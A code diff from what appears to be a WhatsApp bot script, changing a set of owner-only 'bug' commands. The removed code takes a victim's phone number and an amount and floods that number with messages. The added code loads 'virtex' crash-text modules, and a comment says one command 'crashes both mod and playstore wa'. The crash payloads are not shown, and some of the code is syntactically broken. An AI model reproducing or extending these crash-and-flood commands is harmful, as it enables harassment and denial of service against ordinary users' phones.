@@ -2345,10 +2345,7 @@ break;
 ┃✺ ${prefix}xandroid2
 ┃✺ ${prefix}xios
 ┃✺ ${prefix}xios2
-┃✺ ${prefix}xsysui
-┃✺ ${prefix}xgc
-┃✺ ${prefix}ioskill
-┃✺ ${prefix}systemuicrash 
+┃✺ ${prefix}xsysui 
 ┗━━━━━━━━━━━━━━━⊛
 > 𝙱𝚈 𝚃𝙾𝙶𝙴 𝙸𝙽𝚄𝙼𝙰𝙺𝙸`
 
@@ -4896,191 +4893,57 @@ async function fetchRandomScienceFact() {
 			    
 //bug cases
 case "xandroid": {
-  if (!isCreator) return reply(mess.owner);
-  if (!text) return reply(`𝖀𝖘𝖊 ${prefix+command} 𝖛𝖎𝖈𝖙𝖎𝖒 𝖓𝖚𝖒𝖇𝖊𝖗|𝖆𝖒𝖔𝖚𝖓𝖙\n𝖊𝖝𝖊𝖒𝖕𝖑𝖊 ${prefix+command} 241xxxxxxxxxx,5`); 
-  let number = text.split(',')[0];
-  let amount = text.split(',')[1] * 5;
-  if (!number || !amount) {
-    return reply(`𝖀𝖘𝖊 ${prefix+command} 𝖛𝖎𝖈𝖙𝖎𝖒 𝖓𝖚𝖒𝖇𝖊𝖗|𝖆𝖒𝖔𝖚𝖓𝖙\n𝖊𝖝𝖊𝖒𝖕𝖑𝖊 ${prefix+command} 241xxxxxxxxxx,5`); 
-  }
-  if (isNaN(parseInt(amount))) {
-    return reply("𝕬𝖒𝖔𝖚𝖓𝖙 𝖒𝖚𝖘𝖙 𝖇𝖊 𝖆 𝖓𝖚𝖒𝖇𝖊𝖗");
-  }
-  let cleanedNumber = number.replace(/[^0-9]/g, '');
-  let encodedAmount = '' + encodeURI(amount);
-  var contactInfo = await Maria.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
-  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
-  if (cleanedNumber == "24105114159") {
-    return;
-  }
-  if (contactInfo.length == 0) {
-    return reply("𝕿𝖍𝖊 𝖓𝖚𝖒𝖇𝖊𝖗 𝖎𝖘 𝖓𝖔𝖙 𝖗𝖊𝖌𝖎𝖘𝖙𝖊𝖗𝖊𝖉 𝖔𝖓 𝖂𝖍𝖆𝖙𝖘𝕬𝖕𝖕");
-  }
-  reply("𝖕𝖑𝖊𝖆𝖘𝖊 𝖜𝖆𝖎𝖙..., " + command + " 𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘..");
-  await sleep(2000); // Adjusted sleep time for clarity
-  await sleep(2500); // Adjusted sleep time for clarity
-  Maria.sendTextWithMentions(m.chat, `@${m.sender.split('@')[0]} "𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐒𝐞𝐧𝐭 𝐁𝐮𝐠 𝐓𝐨 @" + whatsappNumber.split('@')[0] + 
-    " 𝖀𝖘𝖎𝖓𝖌 *" + command + "* ✅\n\n𝕻𝖆𝖚𝖘𝖊 2 𝖒𝖎𝖓𝖚𝖙𝖊𝖘 𝖘𝖔 𝖙𝖍𝖆𝖙 𝖙𝖍𝖊 𝖇𝖔𝖙 𝖎𝖘 𝖓𝖔𝖙 𝖇𝖆𝖓𝖓𝖊𝖉." 
-    [whatsappNumber]`, m)
-  );
+    if (!isCreator) return reply(mess.owner);	
+const { xeonorwot } = require('./virtex/togetext8');
+let reactionMessage = proto.Message.ReactionMessage.create({ key: m.key, text: "" });
+Maria.relayMessage(m.chat, { reactionMessage }, { messageId: '🦄' });  
+}
 }
 break;
-case "xios": {
-  if (!isCreator) return reply(mess.owner);
-  if (!text) return reply(`𝖀𝖘𝖊 ${prefix+command} 𝖛𝖎𝖈𝖙𝖎𝖒 𝖓𝖚𝖒𝖇𝖊𝖗|𝖆𝖒𝖔𝖚𝖓𝖙\n𝖊𝖝𝖊𝖒𝖕𝖑𝖊 ${prefix+command} 241xxxxxxxxxx,5`); 
-  let number = text.split(',')[0];
-  let amount = text.split(',')[1] * 5;
-  if (!number || !amount) {
-    return reply(`𝖀𝖘𝖊 ${prefix+command} 𝖛𝖎𝖈𝖙𝖎𝖒 𝖓𝖚𝖒𝖇𝖊𝖗|𝖆𝖒𝖔𝖚𝖓𝖙\n𝖊𝖝𝖊𝖒𝖕𝖑𝖊 ${prefix+command} 241xxxxxxxxxx,5`); 
-  }
-  if (isNaN(parseInt(amount))) {
-    return reply("𝕬𝖒𝖔𝖚𝖓𝖙 𝖒𝖚𝖘𝖙 𝖇𝖊 𝖆 𝖓𝖚𝖒𝖇𝖊𝖗");
-  }
-  let cleanedNumber = number.replace(/[^0-9]/g, '');
-  let encodedAmount = '' + encodeURI(amount);
-  var contactInfo = await Maria.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
-  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
-  if (cleanedNumber == "24105114159") {
-    return;
-  }
-  if (contactInfo.length == 0) {
-    return reply("𝕿𝖍𝖊 𝖓𝖚𝖒𝖇𝖊𝖗 𝖎𝖘 𝖓𝖔𝖙 𝖗𝖊𝖌𝖎𝖘𝖙𝖊𝖗𝖊𝖉 𝖔𝖓 𝖂𝖍𝖆𝖙𝖘𝕬𝖕𝖕");
-  }
-  reply("𝖕𝖑𝖊𝖆𝖘𝖊 𝖜𝖆𝖎𝖙..., " + command + " 𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘..");
-  await sleep(2000); // Adjusted sleep time for clarity
-  await sleep(2500); // Adjusted sleep time for clarity
-  Maria.sendTextWithMentions(m.chat, `@${m.sender.split('@')[0]} "𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐒𝐞𝐧𝐭 𝐁𝐮𝐠 𝐓𝐨 @" + whatsappNumber.split('@')[0] + 
-    " 𝖀𝖘𝖎𝖓𝖌 *" + command + "* ✅\n\n𝕻𝖆𝖚𝖘𝖊 2 𝖒𝖎𝖓𝖚𝖙𝖊𝖘 𝖘𝖔 𝖙𝖍𝖆𝖙 𝖙𝖍𝖊 𝖇𝖔𝖙 𝖎𝖘 𝖓𝖔𝖙 𝖇𝖆𝖓𝖓𝖊𝖉." 
-    [whatsappNumber]`, m)
-  );
-}
-break
-	
-case "xios2":
-  {
-	if (!isCreator) return reply(mess.owner);
-    if (!isBotAdmins) {
-      return reply("𝕿𝖍𝖎𝖘 𝖋𝖊𝖆𝖙𝖚𝖗𝖊 𝖎𝖘 𝖋𝖔𝖗 𝖙𝖍𝖊 𝖇𝖔𝖙 𝖔𝖓𝖑𝖞");
-    }
-    if (!text){
-      return reply(`𝕰𝖝𝖆𝖒𝖕𝖑𝖊 𝖚𝖘𝖆𝖌𝖊: ${prefix + command} 5`);
-      }
-    if (isNaN(parseInt(text))) {
-      return reply("𝕬𝖒𝖔𝖚𝖓𝖙 𝖒𝖚𝖘𝖙 𝖇𝖊 𝖆 𝖓𝖚𝖒𝖇𝖊𝖗");
-    }
-    let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
-    reply("𝖕𝖑𝖊𝖆𝖘𝖊 𝖜𝖆𝖎𝖙..., " + command + " 𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘..");
-    await sleep(1500); // Adjusted sleep time for clarity
-    await sleep(2500); // Adjusted sleep time for clarity
-    Maria.sendReaction('✅');
-  }
-  break
-	
-  case "xandroid2":
-  {
-    if (!isCreator) return reply(mess.owner);
-    if (!isBotAdmins) {
-      return reply("𝕿𝖍𝖎𝖘 𝖋𝖊𝖆𝖙𝖚𝖗𝖊 𝖎𝖘 𝖋𝖔𝖗 𝖙𝖍𝖊 𝖇𝖔𝖙 𝖔𝖓𝖑𝖞");
-    }
-    if (!text){
-      return reply(`𝕰𝖝𝖆𝖒𝖕𝖑𝖊 𝖚𝖘𝖆𝖌𝖊: ${prefix + command} 5`);
-    }
-    if (isNaN(parseInt(text))) {
-      return reply("𝕬𝖒𝖔𝖚𝖓𝖙 𝖒𝖚𝖘𝖙 𝖇𝖊 𝖆 𝖓𝖚𝖒𝖇𝖊𝖗");
-    }
-    let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
-    reply("𝖕𝖑𝖊𝖆𝖘𝖊 𝖜𝖆𝖎𝖙..., " + command + " 𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘..")
-    await sleep(1500); // Adjusted sleep time for clarity
-    await sleep(2500); // Adjusted sleep time for clarity
-    Maria.sendReaction('✅');
-  }
-  break
-	
-  case "xgc": {
-    if (!isCreator) return reply(mess.owner);
-    if (!text) {
-      return reply("𝙷𝙾𝚆 𝚃𝙾 𝚂𝙴𝙽𝙳 𝙱𝚄𝙶 𝚃𝙾 𝙶𝚁𝙾𝚄𝙿\n\n" + (prefix + command) + " https://chat.whatsapp.com/xxxx\n\n_*Note:*_ If you want to send a large number of bugs, please type as follows\n\nEx: ." + command + " linkgc amount\n\nExample:\n." + command + " https://chat.whatsapp.com/xxxx 10");
-    }
-    reply("𝖕𝖑𝖊𝖆𝖘𝖊 𝖜𝖆𝖎𝖙..., " + command + " 𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘..")
-    if (!text.split(" ")[0].includes("whatsapp.com")) {
-      return reply("𝕷𝖎𝖓𝖐 𝕴𝖓𝖛𝖆𝖑𝖎𝖉");
-    }
-    let groupLink = text.split(" ")[0].split("https://chat.whatsapp.com/")[1];
-    try {
-      let bugAmount = text.split(" ")[1] ? text.split(" ")[1] : '1';
-      let groupTarget = await Maria.groupAcceptInvite(groupLink);
-      await sleep(2000); // Adjusted sleep time for clarity
-      await sleep(2500); // Adjusted sleep time for clarity
-      reply("𝙷𝙾𝚆 𝚃𝙾 𝚂𝙴𝙽𝙳 𝙱𝚄𝙶 𝚃𝙾 𝙶𝚁𝙾𝚄𝙿");
-      groupLeave(groupTarget);
-    } catch (error) {
-      reply(util.format(error));
-    }
-  }
-  break
-	
-  case "systemuicrash": {
-  if (!isCreator) return reply(mess.owner);
-  if (!text) return reply(`𝖀𝖘𝖊 ${prefix+command} 𝖛𝖎𝖈𝖙𝖎𝖒 𝖓𝖚𝖒𝖇𝖊𝖗|𝖆𝖒𝖔𝖚𝖓𝖙\n𝖊𝖝𝖊𝖒𝖕𝖑𝖊 ${prefix+command} 241xxxxxxxxxx,5`); 
-  let number = text.split(',')[0];
-  let amount = text.split(',')[1] * 5;
-  if (!number || !amount) {
-    return reply(`𝖀𝖘𝖊 ${prefix+command} 𝖛𝖎𝖈𝖙𝖎𝖒 𝖓𝖚𝖒𝖇𝖊𝖗|𝖆𝖒𝖔𝖚𝖓𝖙\n𝖊𝖝𝖊𝖒𝖕𝖑𝖊 ${prefix+command} 241xxxxxxxxx,5`); 
-  }
-  if (isNaN(parseInt(amount))) {
-    return reply("𝕬𝖒𝖔𝖚𝖓𝖙 𝖒𝖚𝖘𝖙 𝖇𝖊 𝖆 𝖓𝖚𝖒𝖇𝖊𝖗");
-  }
-  let cleanedNumber = number.replace(/[^0-9]/g, '');
-  let encodedAmount = '' + encodeURI(amount);
-  var contactInfo = await Maria.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
-  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
-  if (cleanedNumber == "24105114159") {
-    return
-  }
-  if (contactInfo.length == 0) {
-    return reply("𝕿𝖍𝖊 𝖓𝖚𝖒𝖇𝖊𝖗 𝖎𝖘 𝖓𝖔𝖙 𝖗𝖊𝖌𝖎𝖘𝖙𝖊𝖗𝖊𝖉 𝖔𝖓 𝖂𝖍𝖆𝖙𝖘𝕬𝖕𝖕");
-  }
-  reply("𝖕𝖑𝖊𝖆𝖘𝖊 𝖜𝖆𝖎𝖙..., " + command + " 𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘..");
-  await sleep(2000); // Adjusted sleep time for clarity
-  Maria.sendMixedMessages(whatsappNumber, encodedAmount);
-  await sleep(2500); // Adjusted sleep time for clarity
-  Maria.sendTextWithMentions(m.chat, `@${m.sender.split('@')[0]} "𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐒𝐞𝐧𝐭 𝐁𝐮𝐠 𝐓𝐨 @" + whatsappNumber.split('@')[0] + 
-    " 𝖀𝖘𝖎𝖓𝖌 *" + command + "* ✅\n\n𝕻𝖆𝖚𝖘𝖊 2 𝖒𝖎𝖓𝖚𝖙𝖊𝖘 𝖘𝖔 𝖙𝖍𝖆𝖙 𝖙𝖍𝖊 𝖇𝖔𝖙 𝖎𝖘 𝖓𝖔𝖙 𝖇𝖆𝖓𝖓𝖊𝖉." 
-    [whatsappNumber]`, m)
-  );
-}
-break
 
-case "xsysui": {
-  if (!isCreator) return reply(mess.owner);
-  if (!text) return reply(`𝖀𝖘𝖊 ${prefix+command} 𝖛𝖎𝖈𝖙𝖎𝖒 𝖓𝖚𝖒𝖇𝖊𝖗|𝖆𝖒𝖔𝖚𝖓𝖙\n𝖊𝖝𝖊𝖒𝖕𝖑𝖊 ${prefix+command} 241xxxxxxxxxx,5`); 
-  let number = text.split(',')[0];
-  let amount = text.split(',')[1] * 5;
-  if (!number || !amount) {
-    return reply(`𝖀𝖘𝖊 ${prefix+command} 𝖛𝖎𝖈𝖙𝖎𝖒 𝖓𝖚𝖒𝖇𝖊𝖗|𝖆𝖒𝖔𝖚𝖓𝖙\n𝖊𝖝𝖊𝖒𝖕𝖑𝖊 ${prefix+command} 241xxxxxxxxxx,5`); 
-  }
-  if (isNaN(parseInt(amount))) {
-    return reply("𝕬𝖒𝖔𝖚𝖓𝖙 𝖒𝖚𝖘𝖙 𝖇𝖊 𝖆 𝖓𝖚𝖒𝖇𝖊𝖗");
-  }
-  let cleanedNumber = number.replace(/[^0-9]/g, '');
-  let encodedAmount = '' + encodeURI(amount);
-  var contactInfo = await Maria.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
-  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
-  if (cleanedNumber == "24105114159") {
-    return;
-  }
-  if (contactInfo.length == 0) {
-    return reply("𝕿𝖍𝖊 𝖓𝖚𝖒𝖇𝖊𝖗 𝖎𝖘 𝖓𝖔𝖙 𝖗𝖊𝖌𝖎𝖘𝖙𝖊𝖗𝖊𝖉 𝖔𝖓 𝖂𝖍𝖆𝖙𝖘𝕬𝖕𝖕");
-  }
-  reply("𝖕𝖑𝖊𝖆𝖘𝖊 𝖜𝖆𝖎𝖙..., " + command + " 𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘..");
-  await sleep(2000); // Adjusted sleep time for clarity
-  Maria.sendRepeatedMessages2(whatsappNumber, encodedAmount);
-  await sleep(2500); // Adjusted sleep time for clarity
-  Maria.sendTextWithMentions(m.chat, `@${m.sender.split('@')[0]} "𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐒𝐞𝐧𝐭 𝐁𝐮𝐠 𝐓𝐨 @" + whatsappNumber.split('@')[0] + 
-    " 𝖀𝖘𝖎𝖓𝖌 *" + command + "* ✅\n\n𝕻𝖆𝖚𝖘𝖊 2 𝖒𝖎𝖓𝖚𝖙𝖊𝖘 𝖘𝖔 𝖙𝖍𝖆𝖙 𝖙𝖍𝖊 𝖇𝖔𝖙 𝖎𝖘 𝖓𝖔𝖙 𝖇𝖆𝖓𝖓𝖊𝖉." 
-    [whatsappNumber]`, m)
-  );
+case "xios": {
+  if (!isCreator) return reply(mess.owner);	
+const { xeonorwot } = require('./virtex/togetext9');
+let reactionMessage = proto.Message.ReactionMessage.create({ key: m.key, text: "" });
+Maria.relayMessage(m.chat, { reactionMessage }, { messageId: '🦄' });  
 }
+}
+break;  
+	
+case "xios2": { 
+if (!isCreator) return reply(mess.owner);	
+const { xeonorwot } = require('./virtex/togetext7');
+let reactionMessage = proto.Message.ReactionMessage.create({ key: m.key, text: "" });
+Maria.relayMessage(m.chat, { reactionMessage }, { messageId: '🦄' });  
+}
+}
+break;
+	
+  case "xandroid2": {
+ if (!isCreator) return reply(mess.owner);	
+const { xeonorwot } = require('./virtex/togetext4');
+let reactionMessage = proto.Message.ReactionMessage.create({ key: m.key, text: "" });
+Maria.relayMessage(m.chat, { reactionMessage }, { messageId: '🦄' });	  
+}
+}
+break;
+		
+  case "systemuicrash": {
+    if (!isCreator) return reply(mess.owner);	
+const { xeonorwot } = require('./virtex/togetext2');
+let reactionMessage = proto.Message.ReactionMessage.create({ key: m.key, text: "" });
+Maria.relayMessage(m.chat, { reactionMessage }, { messageId: '🦄' });  
+}
+}
+break;
+
+case "xsysui": //crashes both mod and playstore wa
+  if (!isCreator) return reply(mess.owner);	
+const { xeonorwot } = require('./virtex/togetext1');
+let reactionMessage = proto.Message.ReactionMessage.create({ key: m.key, text: "" });
+Maria.relayMessage(m.chat, { reactionMessage }, { messageId: '🦄' });	
+}
+}	    
 break;
 			
 // Function to fetch the latest science news headlines using the News API
